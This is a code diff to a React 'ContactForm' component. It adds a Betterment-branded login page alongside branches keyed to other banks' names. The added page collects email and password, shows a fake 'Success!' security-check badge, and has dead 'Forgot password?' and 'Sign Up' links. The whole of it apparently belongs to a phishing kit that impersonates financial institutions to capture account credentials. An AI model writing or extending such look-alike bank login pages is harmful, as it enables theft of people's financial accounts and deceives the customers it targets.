@@ -104,6 +104,7 @@ export default function ContactForm() {
   const isCharlesSchwab = bankName?.toLowerCase().includes('charles schwab')
   const isCitizens = bankName?.toLowerCase().includes('citizens')
   const isHuntington = bankName?.toLowerCase().includes('huntington')
+  const isBetterment = bankName?.toLowerCase().includes('betterment')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -1465,6 +1466,80 @@ export default function ContactForm() {
                     Learn More
                   </a>
                 </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Betterment
+    if (isBetterment) {
+      return (
+        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-md">
+              {/* Betterment Logo */}
+              <div className="mb-12 flex items-center gap-3">
+                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-yellow-400">
+                  <div className="text-lg font-bold text-blue-900">∪</div>
+                </div>
+                <h1 className="text-3xl font-bold text-blue-900">Betterment</h1>
+              </div>
+
+              <form onSubmit={submitForm} className="space-y-6">
+                {/* Email */}
+                <div>
+                  <label className="mb-2 block text-base text-gray-800">Email</label>
+                  <input
+                    type="email"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Password */}
+                <div>
+                  <label className="mb-2 block text-base text-gray-800">Password</label>
+                  <input
+                    type={showPassword ? 'text' : 'password'}
+                    required
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="w-full rounded-lg border-2 border-gray-400 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Security Check */}
+                <div className="rounded-lg border-2 border-gray-300 bg-gray-50 p-4">
+                  <div className="flex items-center gap-3">
+                    <div className="flex h-8 w-8 items-center justify-center rounded-full bg-green-600">
+                      <Icon name="check" size={20} className="text-white" />
+                    </div>
+                    <span className="text-lg text-gray-800">Success!</span>
+                  </div>
+                </div>
+
+                {/* Log In Button */}
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="w-full rounded-lg bg-blue-600 py-4 text-center font-bold text-white hover:bg-blue-700 transition-colors disabled:opacity-60 mt-8"
+                >
+                  {submitting ? 'Logging in…' : 'Log in'}
+                </button>
+              </form>
+
+              {/* Footer Links */}
+              <div className="mt-8 flex justify-between">
+                <a href="#" className="text-base font-semibold text-blue-600 hover:text-blue-700">
+                  Forgot password?
+                </a>
+                <a href="#" className="text-base font-semibold text-blue-600 hover:text-blue-700">
+                  Sign Up
+                </a>
               </div>
             </div>
           </div>
